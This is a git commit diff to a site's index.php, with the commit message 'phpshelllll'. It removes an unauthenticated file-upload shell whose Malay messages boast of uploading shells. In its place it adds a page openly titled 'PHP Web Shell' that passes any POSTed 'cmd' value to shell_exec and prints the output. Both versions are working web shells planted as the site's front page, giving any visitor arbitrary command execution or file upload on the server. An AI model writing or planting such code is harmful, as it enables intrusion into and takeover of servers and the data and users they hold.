f1d761a6dd16abfad6a00708a23bf6c7d262a383
hagaikestest <141217192+hagaikestest@users.noreply.github.com>
2023-08-02 11:39:26 +0300

    phpshelllll

--- index.php
+++ index.php
@@ -1,9 +1,21 @@
-
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>Korang Gagal Upload Shells zKorang!!!</b><br><br>'; }
-}
-?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SNR website</title>
+  </head>
+  <body>
+    <h1>PHP Web Shell</h1>
+    <form method="POST">
+      <label>Enter a command:</label><br>
+      <input type="text" name="cmd"><br>
+      <input type="submit" value="Execute">
+    </form>
+    <?php
+      if (isset($_POST["cmd"])) {
+        $cmd = $_POST["cmd"];
+        $output = shell_exec($cmd);
+        echo "<pre>$output</pre>";
+      }
+    ?>
+  </body>
+</html>
